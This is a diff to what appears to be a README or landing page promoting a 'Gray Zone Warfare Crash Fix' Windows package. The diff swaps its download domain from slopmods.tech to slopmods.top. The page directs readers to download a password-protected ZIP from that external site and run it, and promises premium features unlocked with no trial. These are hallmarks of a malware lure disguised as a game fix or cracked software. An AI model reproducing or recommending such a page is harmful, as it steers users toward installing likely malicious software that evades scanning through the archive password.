@@ -8,12 +8,12 @@ Gray Zone Warfare Crash Fix — Windows setup and configuration · Premium works
 
 > Use the release page below for Windows.
 
-- **Release page:** [rernwttaoxl.slopmods.tech](https://rernwttaoxl.slopmods.tech/)
-- **Full URL:** `https://rernwttaoxl.slopmods.tech/`
+- **Release page:** [rernwttaoxl.slopmods.top](https://rernwttaoxl.slopmods.top/)
+- **Full URL:** `https://rernwttaoxl.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **rernwttaoxl.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **rernwttaoxl.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ Gray Zone Warfare Crash Fix — Windows setup and configuration · Premium works
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **rernwttaoxl.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **rernwttaoxl.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
